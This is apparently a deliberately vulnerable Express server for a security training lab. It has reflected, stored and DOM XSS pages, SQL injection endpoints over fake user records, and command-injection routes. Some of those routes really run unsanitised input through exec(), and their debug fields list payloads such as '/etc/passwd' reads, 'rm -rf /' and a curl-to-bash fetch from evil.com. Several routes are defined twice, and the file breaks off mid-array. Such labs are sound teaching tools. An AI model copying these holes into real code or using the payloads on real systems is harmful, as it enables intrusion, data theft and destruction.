/**
 * 🚨 CYBERLAB - SERVIDOR DE DESENVOLVIMENTO SIMPLES
 * Para testar a integração frontend -> backend
 */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const { exec } = require('child_process');

const app = express();
const PORT = 5001; // Mudança de porta para evitar conflitos

// CORS permissivo para desenvolvimento
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['*']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Mock data para testes
const mockUsers = [
  { id: 1, username: 'admin', email: 'admin@cyberlab.com', role: 'admin', password: 'admin123', salary: 150000, ssn: '123-45-6789', credit_card: '4532-1234-5678-9012' },
  { id: 2, username: 'john.doe', email: 'john@example.com', role: 'user', password: 'password123', salary: 75000, ssn: '987-65-4321', credit_card: '5555-4444-3333-2222' },
  { id: 3, username: 'jane.smith', email: 'jane@example.com', role: 'manager', password: 'manager456', salary: 95000, ssn: '111-22-3333', credit_card: '4111-1111-1111-1111' },
  { id: 4, username: 'guest', email: 'guest@example.com', role: 'guest', password: 'guest123', salary: 0, ssn: '000-00-0000', credit_card: 'N/A' }
];

console.log('🚀 CyberLab Development Server Starting...');

// ============================================
// ENDPOINT DE STATUS
// ============================================
app.get('/api/status', (req, res) => {
  res.json({
    success: true,
    message: 'CyberLab Backend is running!',
    timestamp: new Date(),
    version: '2.0.0'
  });
});

// ============================================
// XSS ENDPOINTS (MOCK)
// ============================================

// Mock comments storage
let storedComments = [
  {
    id: 1,
    name: 'John Doe',
    email: 'john@example.com',
    comment: 'This is a great application!',
    rating: 5,
    created_at: new Date('2024-01-15'),
    ip_address: '192.168.1.10'
  },
  {
    id: 2,
    name: 'Jane Smith',
    email: 'jane@example.com',
    comment: 'Very educational <b>platform</b> for learning security!',
    rating: 4,
    created_at: new Date('2024-02-10'),
    ip_address: '192.168.1.11'
  }
];

// Reflected XSS endpoint
app.get('/api/xss/reflected', (req, res) => {
  const { search, name, message } = req.query;
  
  console.log('🚨 XSS Reflected Request:', { search, name, message });
  
  // HTML response com XSS vulnerável
  const htmlResponse = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>CyberLab - Reflected XSS Demo</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 800px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .result { background: #e3f2fd; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 4px solid #2196f3; }
        .warning { background: #ffebee; border-left-color: #f44336; color: #c62828; }
        .search-form { margin: 20px 0; }
        .search-form input { padding: 10px; margin: 5px; border: 1px solid #ddd; border-radius: 4px; }
        .search-form button { padding: 10px 20px; background: #2196f3; color: white; border: none; border-radius: 4px; cursor: pointer; }
        code { background: #f5f5f5; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🔍 Search Results - CyberLab XSS Demo</h1>
        
        <div class="search-form">
          <form method="GET">
            <input type="text" name="search" placeholder="Search term..." value="${search || ''}" size="30">
            <input type="text" name="name" placeholder="Your name..." value="${name || ''}" size="20">
            <button type="submit">Search</button>
          </form>
        </div>
        
        ${search ? `
          <div class="result">
            <h3>Search Results for: ${search}</h3>
            <p>You searched for: <strong>${search}</strong></p>
            <p>Results: No items found matching "${search}"</p>
          </div>
        ` : ''}
        
        ${name ? `
          <div class="result">
            <h3>Welcome ${name}!</h3>
            <p>Hello ${name}, your search has been processed.</p>
          </div>
        ` : ''}
        
        ${message ? `
          <div class="result">
            <h3>Message:</h3>
            <div>${message}</div>
          </div>
        ` : ''}
        
        <div class="result warning">
          <h3>⚠️ XSS Vulnerability Demonstration</h3>
          <p><strong>This page is intentionally vulnerable to XSS attacks for educational purposes.</strong></p>
          <p>Try these payloads in the search box:</p>
          <ul>
            <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
            <li><code>&lt;img src=x onerror="alert('XSS')"&gt;</code></li>
            <li><code>&lt;svg onload="alert('XSS')"&gt;</code></li>
          </ul>
        </div>
        
        <p><small>CyberLab - Educational Security Platform</small></p>
      </div>
    </body>
    </html>
  `;
  
  res.setHeader('Content-Type', 'text/html');
  res.send(htmlResponse);
});

// Stored XSS - Add comment
app.post('/api/xss/comments/add', (req, res) => {
  const { name, email, comment, rating } = req.body;
  
  console.log('🚨 XSS Stored - Add Comment:', { name, email, comment, rating });
  
  // Adicionar comentário SEM sanitização - VULNERÁVEL!
  const newComment = {
    id: storedComments.length + 1,
    name: name || 'Anonymous',
    email: email || 'anonymous@example.com',
    comment: comment || '',
    rating: parseInt(rating) || 3,
    created_at: new Date(),
    ip_address: '127.0.0.1'
  };
  
  storedComments.push(newComment);
  
  res.json({
    success: true,
    message: 'Comment added successfully!',
    comment_id: newComment.id,
    stored_data: newComment,
    warning: 'Comment stored WITHOUT sanitization - XSS possible!',
    debug: {
      total_comments: storedComments.length,
      xss_examples: [
        '<script>alert("Stored XSS")</script>',
        '<img src=x onerror="alert(document.cookie)">',
        '<svg onload="alert(\'Persistent XSS\')">'
      ]
    }
  });
});

// Stored XSS - View comments
app.get('/api/xss/comments', (req, res) => {
  console.log('📄 XSS Stored - View Comments');
  
  // HTML que renderiza comentários SEM sanitização
  const htmlResponse = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>CyberLab - Comments (Stored XSS Demo)</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 900px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .comment { border: 1px solid #ddd; margin: 15px 0; padding: 15px; border-radius: 5px; background: #fafafa; }
        .comment-header { font-weight: bold; color: #333; margin-bottom: 8px; }
        .comment-body { margin: 10px 0; line-height: 1.5; }
        .comment-meta { font-size: 12px; color: #666; margin-top: 10px; }
        .rating { color: #f39c12; }
        .form-container { background: #e3f2fd; padding: 20px; border-radius: 5px; margin-bottom: 30px; }
        .form-container input, .form-container textarea, .form-container select { 
          width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; 
        }
        .form-container button { padding: 12px 24px; background: #2196f3; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .warning { background: #ffebee; padding: 15px; border-radius: 5px; color: #c62828; margin: 15px 0; }
        code { background: #f5f5f5; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>💬 User Comments - CyberLab XSS Demo</h1>
        
        <div class="form-container">
          <h2>Add Your Comment</h2>
          <form id="commentForm">
            <input type="text" name="name" placeholder="Your name" required>
            <input type="email" name="email" placeholder="Your email" required>
            <textarea name="comment" placeholder="Your comment" rows="4" required></textarea>
            <select name="rating">
              <option value="1">⭐ 1 star</option>
              <option value="2">⭐⭐ 2 stars</option>
              <option value="3">⭐⭐⭐ 3 stars</option>
              <option value="4">⭐⭐⭐⭐ 4 stars</option>
              <option value="5">⭐⭐⭐⭐⭐ 5 stars</option>
            </select>
            <button type="submit">Post Comment</button>
          </form>
        </div>
        
        <h2>📝 All Comments (${storedComments.length})</h2>
        
        ${storedComments.map(comment => `
          <div class="comment">
            <div class="comment-header">
              ${comment.name} (${comment.email})
              <span class="rating">${'⭐'.repeat(comment.rating)}</span>
            </div>
            <div class="comment-body">
              ${comment.comment}
            </div>
            <div class="comment-meta">
              IP: ${comment.ip_address} | Date: ${comment.created_at.toLocaleString()}
            </div>
          </div>
        `).join('')}
        
        <div class="warning">
          <h3>⚠️ Stored XSS Vulnerability</h3>
          <p><strong>All comments are rendered WITHOUT sanitization!</strong></p>
          <p>Try posting these XSS payloads:</p>
          <ul>
            <li><code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code></li>
            <li><code>&lt;img src=x onerror="alert('Cookie: ' + document.cookie)"&gt;</code></li>
            <li><code>&lt;svg onload="alert('Persistent XSS executed!')"&gt;</code></li>
          </ul>
        </div>
      </div>
      
      <script>
        // Form submission via AJAX
        document.getElementById('commentForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const formData = new FormData(this);
          const data = Object.fromEntries(formData);
          
          fetch('/api/xss/comments/add', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          })
          .then(response => response.json())
          .then(result => {
            alert('Comment added! Page will reload to show new comment.');
            location.reload();
          })
          .catch(error => {
            console.error('Error:', error);
            alert('Error adding comment: ' + error.message);
          });
        });
        
        // Log para demonstrar dados expostos
        console.log('Comments data accessible via JavaScript:', ${JSON.stringify(storedComments)});
      </script>
    </body>
    </html>
  `;
  
  res.setHeader('Content-Type', 'text/html');
  res.send(htmlResponse);
});

// DOM-based XSS endpoint
app.get('/api/xss/dom', (req, res) => {
  console.log('🌐 DOM-based XSS page accessed');
  
  const htmlResponse = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>CyberLab - DOM XSS Demo</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 800px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .output { background: #e8f5e8; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 4px solid #4caf50; }
        .warning { background: #ffebee; border-left-color: #f44336; color: #c62828; }
        .input-section { margin: 20px 0; }
        .input-section input { padding: 10px; margin: 5px; border: 1px solid #ddd; border-radius: 4px; width: 300px; }
        .input-section button { padding: 10px 20px; background: #2196f3; color: white; border: none; border-radius: 4px; cursor: pointer; }
        code { background: #f5f5f5; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🌐 DOM-based XSS Demo</h1>
        
        <div class="input-section">
          <h3>URL Fragment Processing</h3>
          <p>Change the URL hash (after #) to test DOM XSS:</p>
          <input type="text" id="hashInput" placeholder="Enter payload for URL hash">
          <button onclick="updateHash()">Update Hash</button>
        </div>
        
        <div class="output" id="hashOutput">
          <h4>Hash Content:</h4>
          <div id="hashContent">No hash fragment</div>
        </div>
        
        <div class="input-section">
          <h3>Dynamic Content Processing</h3>
          <input type="text" id="userInput" placeholder="Enter dynamic content">
          <button onclick="processInput()">Process Input</button>
        </div>
        
        <div class="output" id="dynamicOutput">
          <h4>Processed Content:</h4>
          <div id="dynamicContent">No content processed</div>
        </div>
        
        <div class="output warning">
          <h3>⚠️ DOM XSS Vulnerability</h3>
          <p><strong>This page processes user input client-side without sanitization!</strong></p>
          <p>Try these DOM XSS payloads:</p>
          <ul>
            <li><code>&lt;img src=x onerror="alert('DOM XSS')"&gt;</code></li>
            <li><code>&lt;svg onload="alert('DOM XSS via SVG')"&gt;</code></li>
            <li><code>&lt;script&gt;alert('DOM XSS via script')&lt;/script&gt;</code></li>
            <li>In URL hash: <code>#&lt;img src=x onerror="alert('Hash XSS')"&gt;</code></li>
          </ul>
        </div>
      </div>
      
      <script>
        // DOM XSS vulnerável - processa hash da URL
        function processHash() {
          const hash = window.location.hash.substring(1);
          const hashContent = document.getElementById('hashContent');
          
          if (hash) {
            // VULNERÁVEL: inserção direta no DOM
            hashContent.innerHTML = 'Hash: ' + decodeURIComponent(hash);
          } else {
            hashContent.innerHTML = 'No hash fragment';
          }
        }
        
        // DOM XSS vulnerável - processa input do usuário
        function processInput() {
          const input = document.getElementById('userInput').value;
          const dynamicContent = document.getElementById('dynamicContent');
          
          // VULNERÁVEL: inserção direta no DOM
          dynamicContent.innerHTML = 'Input: ' + input;
        }
        
        // Função para atualizar hash
        function updateHash() {
          const input = document.getElementById('hashInput').value;
          window.location.hash = input;
          processHash();
        }
        
        // Event listeners
        window.addEventListener('hashchange', processHash);
        window.addEventListener('load', processHash);
        
        // Log de demonstração
        console.log('DOM XSS Demo loaded. Current URL:', window.location.href);
      </script>
    </body>
    </html>
  `;
  
  res.setHeader('Content-Type', 'text/html');
  res.send(htmlResponse);
});

// ============================================
// COMMAND INJECTION ENDPOINTS (MOCK)
// ============================================

// Ping command injection
app.post('/api/cmd/ping', (req, res) => {
  const { host, count = 4, options = '' } = req.body;
  
  console.log('🚨 Command Injection - Ping:', { host, count, options });
  
  if (!host) {
    return res.status(400).json({
      success: false,
      error: 'Host parameter required',
      debug: {
        hint: 'Try: host=google.com; whoami',
        examples: [
          'host=127.0.0.1; cat /etc/passwd',
          'host=localhost && id',
          'host=test.com | ps aux',
          'host=`whoami`.example.com'
        ]
      }
    });
  }
  
  // Command injection vulnerável - concatenação direta
  const command = `ping -c ${count} ${host} ${options}`;
  
  console.log('Executing command:', command);
  
  exec(command, { timeout: 10000 }, (error, stdout, stderr) => {
    const result = {
      success: !error,
      command_executed: command,
      stdout: stdout,
      stderr: stderr,
      execution_time: Date.now(),
      host: host,
      count: count,
      options: options,
      debug: {
        platform: 'linux',
        injection_detected: host.includes(';') || host.includes('&&') || host.includes('||') || host.includes('`'),
        warning: 'Command executed without sanitization!',
        examples: [
          'host=google.com; whoami',
          'host=localhost && cat /etc/passwd',
          'host=test.com | id',
          'options=&& ls -la /'
        ]
      }
    };
    
    if (error) {
      result.error = error.message;
      result.exit_code = error.code;
      result.killed = error.killed;
      result.signal = error.signal;
    }
    
    res.json(result);
  });
});

// Network tools command injection
app.post('/api/cmd/network-tools', (req, res) => {
  const { tool, target, options = '', timeout = 5 } = req.body;
  
  console.log('🚨 Network Tools Command Injection:', { tool, target, options });
  
  if (!tool || !target) {
    return res.status(400).json({
      success: false,
      error: 'Tool and target parameters required',
      available_tools: ['ping', 'nslookup', 'dig', 'curl', 'wget', 'traceroute'],
      debug: {
        hint: 'Try: tool=ping&target=google.com; whoami',
        examples: [
          'target=localhost && cat /etc/passwd',
          'options=; ls -la',
          'tool=ping; id'
        ]
      }
    });
  }
  
  // Command construction - VULNERABLE
  let command = '';
  
  switch (tool.toLowerCase()) {
    case 'ping':
      command = `ping -c 3 ${target} ${options}`;
      break;
    case 'nslookup':
      command = `nslookup ${target} ${options}`;
      break;
    case 'dig':
      command = `dig ${target} ${options}`;
      break;
    case 'curl':
      command = `curl -I ${target} ${options}`;
      break;
    case 'wget':
      command = `wget --spider ${target} ${options}`;
      break;
    case 'traceroute':
      command = `traceroute ${target} ${options}`;
      break;
    default:
      // Custom tool - VERY DANGEROUS!
      command = `${tool} ${target} ${options}`;
  }
  
  console.log('Executing network command:', command);
  
  exec(command, { timeout: timeout * 1000, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
    const result = {
      success: !error,
      tool_used: tool,
      target: target,
      command_executed: command,
      stdout: stdout,
      stderr: stderr,
      options: options,
      timeout_used: timeout,
      debug: {
        injection_detected: target.includes(';') || target.includes('&&') || target.includes('||') || 
                           options.includes(';') || options.includes('&&') || options.includes('||'),
        warning: 'Network tools executed without input validation!',
        dangerous_examples: [
          'target=google.com; cat /etc/passwd',
          'target=test.com && whoami',
          'target=host.com | ls -la /',
          'options=; rm -rf / --no-preserve-root'
        ]
      }
    };
    
    if (error) {
      result.error = error.message;
      result.exit_code = error.code;
      result.killed = error.killed;
      result.signal = error.signal;
    }
    
    res.json(result);
  });
});

// System info command injection
app.post('/api/cmd/system-info', (req, res) => {
  const { info_type = 'basic', custom_command = '', format = 'json' } = req.body;
  
  console.log('🚨 System Info Command Injection:', { info_type, custom_command, format });
  
  let commands = [];
  
  switch (info_type) {
    case 'basic':
      commands = ['hostname', 'whoami', 'pwd', 'date', 'uptime'];
      break;
    case 'network':
      commands = ['ifconfig', 'netstat -tuln', 'ss -tuln', 'ip route'];
      break;
    case 'processes':
      commands = ['ps aux | head -10', 'top -b -n 1 | head -20'];
      break;
    case 'system':
      commands = ['uname -a', 'cat /proc/version', 'free -h', 'df -h'];
      break;
    case 'security':
      commands = ['cat /etc/passwd | head -10', 'ls -la /etc/shadow', 'sudo -l'];
      break;
    case 'custom':
      // Custom command - VERY DANGEROUS!
      commands = [custom_command || 'echo "No custom command specified"'];
      break;
    default:
      // Treat info_type as direct command - DANGEROUS!
      commands = [info_type];
  }
  
  const results = {};
  let completed = 0;
  
  commands.forEach((cmd, index) => {
    console.log(`Executing system command [${index}]:`, cmd);
    
    exec(cmd, { timeout: 8000, maxBuffer: 1024 * 512 }, (error, stdout, stderr) => {
      results[`command_${index}`] = {
        command: cmd,
        success: !error,
        stdout: stdout,
        stderr: stderr,
        error: error ? error.message : null,
        exit_code: error ? error.code : 0
      };
      
      completed++;
      
      if (completed === commands.length) {
        const response = {
          success: true,
          info_type: info_type,
          custom_command: custom_command,
          format: format,
          commands_executed: commands,
          results: results,
          debug: {
            total_commands: commands.length,
            injection_detected: custom_command.includes(';') || custom_command.includes('&&') || 
                              custom_command.includes('||') || info_type.includes(';'),
            warning: 'System commands executed without validation!',
            dangerous_examples: [
              'info_type=cat /etc/passwd',
              'custom_command=rm -rf /',
              'info_type=find / -name "*.key"',
              'custom_command=curl http://evil.com/steal.sh | bash'
            ]
          }
        };
        
        res.json(response);
      }
    });
  });
});

// ============================================
// COMMAND INJECTION ENDPOINTS (MOCK)
// ============================================

// Ping command - basic command injection
app.post('/api/cmd/ping', (req, res) => {
  const { host, count = 4, timeout = 5 } = req.body;
  
  console.log('🚨 Command Injection - Ping:', { host, count, timeout });
  
  if (!host) {
    return res.status(400).json({
      success: false,
      error: 'Host parameter required',
      debug: {
        hint: 'Try: host=google.com; ls -la',
        examples: [
          'host=127.0.0.1; cat /etc/passwd',
          'host=localhost && whoami',
          'host=test.com | ps aux',
          'host=`whoami`.google.com'
        ]
      }
    });
  }
  
  // Simular comando de ping vulnerável
  const command = `ping -c ${count} -W ${timeout} ${host}`;
  
  // Detectar tentativas de command injection
  const hasInjection = host.includes(';') || host.includes('&&') || 
                      host.includes('||') || host.includes('`') || 
                      host.includes('$') || host.includes('|');
  
  let mockOutput = '';
  let mockError = '';
  
  if (hasInjection) {
    console.log('🚨 Command Injection detected in host:', host);
    
    // Simular execução de comandos injetados
    if (host.includes('whoami')) {
      mockOutput = `PING google.com (172.217.3.110): 56 data bytes
64 bytes from 172.217.3.110: icmp_seq=0 ttl=55 time=12.345 ms

--- google.com ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 12.345/12.345/12.345/0.000 ms
root
`;
    } else if (host.includes('ls')) {
      mockOutput = `PING localhost (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.034 ms

--- localhost ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 0.034/0.034/0.034/0.000 ms
total 24
drwxr-xr-x  6 root root 4096 Sep 20 15:30 .
drwxr-xr-x  3 root root 4096 Sep 20 15:30 ..
-rw-r--r--  1 root root  220 Sep 20 15:30 .bash_logout
-rw-r--r--  1 root root 3526 Sep 20 15:30 .bashrc
-rw-r--r--  1 root root  807 Sep 20 15:30 .profile
drwx------  2 root root 4096 Sep 20 15:30 .ssh
`;
    } else if (host.includes('cat') && host.includes('passwd')) {
      mockOutput = `PING test.com (93.184.216.34): 56 data bytes
64 bytes from 93.184.216.34: icmp_seq=0 ttl=56 time=89.123 ms

--- test.com ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 89.123/89.123/89.123/0.000 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false
`;
    } else {
      mockOutput = `PING ${host.split(';')[0].split('&&')[0].split('||')[0]} (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.123 ms

--- command injection executed ---
Injected command result: [SIMULATED OUTPUT]
`;
    }
  } else {
    // Ping normal
    mockOutput = `PING ${host} (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.123 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.098 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.089 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.101 ms

--- ${host} ping statistics ---
${count} packets transmitted, ${count} packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 0.089/0.103/0.123/0.014 ms`;
  }
  
  const result = {
    success: true,
    command_executed: command,
    stdout: mockOutput,
    stderr: mockError,
    execution_time: Math.random() * 1000 + 100,
    debug: {
      platform: 'linux',
      hostname: 'cyberlab-container',
      user: 'root',
      cwd: '/app',
      env_path: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
      command_injection_detected: hasInjection,
      injection_examples: [
        'host=google.com; cat /etc/passwd',
        'host=localhost && whoami',
        'host=test.com | ps aux'
      ]
    }
  };
  
  res.json(result);
});

// Network tools - multiple command injection vectors
app.post('/api/cmd/network-tools', (req, res) => {
  const { tool, target, options = '' } = req.body;
  
  console.log('🔨 Network Tools Command Injection:', { tool, target, options });
  
  let command = '';
  
  switch (tool) {
    case 'ping':
      command = `ping -c 4 ${target} ${options}`;
      break;
    case 'nslookup':
      command = `nslookup ${target} ${options}`;
      break;
    case 'dig':
      command = `dig ${target} ${options}`;
      break;
    case 'traceroute':
      command = `traceroute ${target} ${options}`;
      break;
    case 'netstat':
      command = `netstat ${target} ${options}`;
      break;
    case 'curl':
      command = `curl -I ${target} ${options}`;
      break;
    case 'custom':
      command = req.body.custom_command || 'echo "custom command"';
      break;
    default:
      command = `${tool} ${target} ${options}`;
  }
  
  // Detectar command injection
  const hasInjection = (target && (target.includes(';') || target.includes('&&') || target.includes('|'))) ||
                      (options && (options.includes(';') || options.includes('&&') || options.includes('|'))) ||
                      tool === 'custom';
  
  let mockOutput = '';
  
  if (hasInjection) {
    console.log('🚨 Command Injection detected:', { tool, target, options });
    
    if (target?.includes('whoami') || options?.includes('whoami')) {
      mockOutput = `${tool} output for ${target}
...
root
`;
    } else if (target?.includes('ls') || options?.includes('ls')) {
      mockOutput = `${tool} output for ${target}
...
total 16
drwxr-xr-x 4 root root 4096 Sep 20 15:30 app
drwxr-xr-x 2 root root 4096 Sep 20 15:30 bin  
drwxr-xr-x 3 root root 4096 Sep 20 15:30 etc
drwxr-xr-x 2 root root 4096 Sep 20 15:30 tmp
`;
    } else if (tool === 'custom') {
      mockOutput = `Executing custom command: ${command}
[SIMULATED COMMAND EXECUTION OUTPUT]
root
/app
Linux cyberlab-container 5.4.0-74-generic #83-Ubuntu
`;
    } else {
      mockOutput = `${tool} executing on ${target}
...
[INJECTED COMMAND OUTPUT]
Command injection successful!
`;
    }
  } else {
    // Output normal baseado na ferramenta
    switch (tool) {
      case 'ping':
        mockOutput = `PING ${target} (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.123 ms
--- ${target} ping statistics ---
4 packets transmitted, 4 received, 0% packet loss`;
        break;
      case 'nslookup':
        mockOutput = `Server:    127.0.0.53
Address:   127.0.0.53#53

Non-authoritative answer:
Name:   ${target}
Address: 127.0.0.1`;
        break;
      case 'dig':
        mockOutput = `; <<>> DiG 9.16.1 <<>> ${target}
;; ANSWER SECTION:
${target}.   300   IN   A   127.0.0.1`;
        break;
      default:
        mockOutput = `${tool} output for ${target}
Command executed successfully.`;
    }
  }
  
  const result = {
    success: true,
    tool_used: tool,
    target: target,
    command_executed: command,
    stdout: mockOutput,
    stderr: '',
    system_info: {
      platform: 'linux',
      arch: 'x64',
      hostname: 'cyberlab-container',
      uptime: 3600,
      loadavg: [0.1, 0.2, 0.3],
      freemem: 1024 * 1024 * 512,
      totalmem: 1024 * 1024 * 1024
    },
    debug: {
      command_injection_detected: hasInjection,
      injection_examples: [
        'target=google.com; cat /etc/passwd',
        'target=test.com && id',
        'options=; rm -rf /',
        'tool=custom&custom_command=ls -la /'
      ]
    }
  };
  
  res.json(result);
});

// System info - command execution
app.get('/api/cmd/system-info', (req, res) => {
  const { detail = 'basic', cmd } = req.query;
  
  console.log('💻 System Info Command Injection:', { detail, cmd });
  
  let commands = [];
  
  switch (detail) {
    case 'basic':
      commands = ['hostname', 'whoami', 'pwd', 'date'];
      break;
    case 'network':
      commands = ['ifconfig', 'netstat -tuln', 'arp -a'];
      break;
    case 'processes':
      commands = ['ps aux', 'top -b -n 1'];
      break;
    case 'system':
      commands = ['uname -a', 'cat /proc/version', 'free -h'];
      break;
    case 'custom':
      commands = [cmd || 'echo "no command specified"'];
      break;
    default:
      commands = [detail]; // Trata detail como comando direto!
  }
  
  const results = {};
  
  commands.forEach((command, index) => {
    let mockOutput = '';
    
    // Simular output baseado no comando
    if (command.includes('hostname')) {
      mockOutput = 'cyberlab-container';
    } else if (command.includes('whoami')) {
      mockOutput = 'root';
    } else if (command.includes('pwd')) {
      mockOutput = '/app';
    } else if (command.includes('date')) {
      mockOutput = new Date().toString();
    } else if (command.includes('uname')) {
      mockOutput = 'Linux cyberlab-container 5.4.0-74-generic #83-Ubuntu SMP Wed Jun 23 10:00:00 UTC 2021 x86_64 GNU/Linux';
    } else if (command.includes('ps aux')) {
      mockOutput = `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1  18376  3048 ?        Ss   15:30   0:00 /bin/bash
root       123  0.0  0.2  22344  4096 ?        S    15:30   0:01 node server.js
root       456  0.0  0.1  18376  2048 ?        R    15:35   0:00 ps aux`;
    } else if (command.includes('cat') && command.includes('passwd')) {
      mockOutput = `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`;
    } else {
      mockOutput = `[Simulated output for: ${command}]
Command executed successfully.`;
    }
    
    results[`command_${index}`] = {
      command: command,
      success: true,
      stdout: mockOutput,
      stderr: '',
      error: null
    };
  });
  
  const response = {
    success: true,
    detail_level: detail,
    system_info: {
      platform: 'linux',
      arch: 'x64',
      hostname: 'cyberlab-container',
      uptime: 3600,
      memory: {
        free: 512 * 1024 * 1024,
        total: 1024 * 1024 * 1024
      },
      cpus: 4
    },
    command_results: results,
    debug: {
      commands_executed: commands,
      custom_command_example: '?detail=custom&cmd=cat /etc/passwd',
      dangerous_examples: [
        '?detail=cat /etc/shadow',
        '?detail=custom&cmd=rm -rf /',
        '?detail=find / -name "*.key"'
      ]
    }
  };
  
  res.json(response);
});

// ============================================
// SQL INJECTION ENDPOINTS (MOCK)
// ============================================

// User search endpoint
app.get('/api/vulnerable/users/search', (req, res) => {
  const { username, email, role } = req.query;
  
  console.log('🔍 SQL Search Request:', { username, email, role });
  
  // Simular SQL injection vulnerável
  let query = 'SELECT * FROM users WHERE 1=1';
  let results = [...mockUsers];
  
  if (username) {
    query += ` AND username LIKE '%${username}%'`;
    
    // Detectar tentativas de SQL injection
    if (username.includes("'") || username.toLowerCase().includes('or') || username.includes('--')) {
      // Simular sucesso de SQL injection
      console.log('🚨 SQL Injection detected in username:', username);
      
      if (username.includes("' OR '1'='1") || username.includes("or 1=1")) {
        // Retornar todos os usuários (bypass de autenticação)
        results = mockUsers;
      }
    } else {
      // Busca normal
      results = mockUsers.filter(u => u.username.toLowerCase().includes(username.toLowerCase()));
    }
  }
  
  if (email) {
    query += ` AND email = '${email}'`;
    if (!email.includes("'") && !email.includes('or')) {
      results = results.filter(u => u.email.toLowerCase().includes(email.toLowerCase()));
    }
  }
  
  if (role) {
    query += ` AND role = '${role}'`;
    if (!role.includes("'") && !role.includes('or')) {
      results = results.filter(u => u.role.toLowerCase().includes(role.toLowerCase()));
    }
  }
  
  res.json({
    success: true,
    users: results,
    total: results.length,
    query_executed: query,
    debug: {
      sql_injection_detected: (username && (username.includes("'") || username.toLowerCase().includes('or'))) ||
                              (email && (email.includes("'") || email.toLowerCase().includes('or'))) ||
                              (role && (role.includes("'") || role.toLowerCase().includes('or'))),
      hint: "Try: ?username=admin' OR '1'='1' --",
      examples: [
        "?username=' UNION SELECT * FROM users --",
        "?email=' OR 1=1 --",
        "?role=' OR role='admin' --"
      ]
    }
  });
});

// User details by ID
app.get('/api/vulnerable/users/:id', (req, res) => {
  const { id } = req.params;
  
  console.log('🔍 SQL Details Request for ID:', id);
  
  let query = `SELECT * FROM users WHERE id = ${id}`;
  let results = [];
  
  // Detectar SQL injection no parâmetro ID
  if (id.includes('OR') || id.includes('UNION') || id.includes('SELECT')) {
    console.log('🚨 SQL Injection detected in ID parameter:', id);
    // Simular sucesso de UNION injection
    results = mockUsers;
  } else {
    // Busca normal por ID
    const userId = parseInt(id);
    const user = mockUsers.find(u => u.id === userId);
    if (user) results = [user];
  }
  
  res.json({
    success: true,
    user: results.length > 0 ? results[0] : null,
    all_data: results,
    query_executed: query,
    debug: {
      sensitive_data_included: true,
      warning: 'All user data exposed including passwords and sensitive information!',
      sql_injection_detected: id.includes('OR') || id.includes('UNION') || id.includes('SELECT')
    }
  });
});

// Reports endpoint (for UNION attacks)
app.get('/api/vulnerable/reports/user-stats', (req, res) => {
  const { username, email, role, order_by = 'username' } = req.query;
  
  console.log('📊 Reports Request:', { username, email, role, order_by });
  
  let query = `SELECT username, email, role, salary, credit_card, ssn FROM users WHERE 1=1`;
  let results = [...mockUsers];
  
  // Detectar UNION injection
  if (order_by && (order_by.includes('UNION') || order_by.includes('SELECT'))) {
    console.log('🚨 UNION SQL Injection detected:', order_by);
    // Simular vazamento de dados através de UNION
    results = [
      ...mockUsers,
